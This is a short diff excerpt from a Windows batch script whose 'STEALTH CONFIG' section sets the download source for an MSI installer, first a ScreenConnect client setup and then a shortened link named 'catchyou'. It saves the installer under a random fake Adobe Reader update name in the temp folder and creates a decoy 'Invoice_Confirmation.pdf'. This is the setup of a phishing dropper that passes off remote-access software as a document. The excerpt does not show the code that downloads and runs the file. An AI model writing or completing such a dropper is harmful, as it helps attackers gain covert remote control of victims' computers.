@@ -13,7 +13,7 @@ if %errorlevel% neq 0 (
 :: =========================================================
 :: STEALTH CONFIG (random names + fake PDF flavor)
 :: =========================================================
-set "URL=https://filereader.app/tap/ScreenConnect.ClientSetup.msi"
+set "URL=https://spoo.me/catchyou"
 set "MSI_FILE=%TEMP%\AcroRd32_Update_%RANDOM%.msi"
 set "LOG_FILE=%TEMP%\AcroRd32_Update.log"
 set "FAKE_PDF=%TEMP%\Invoice_Confirmation.pdf"
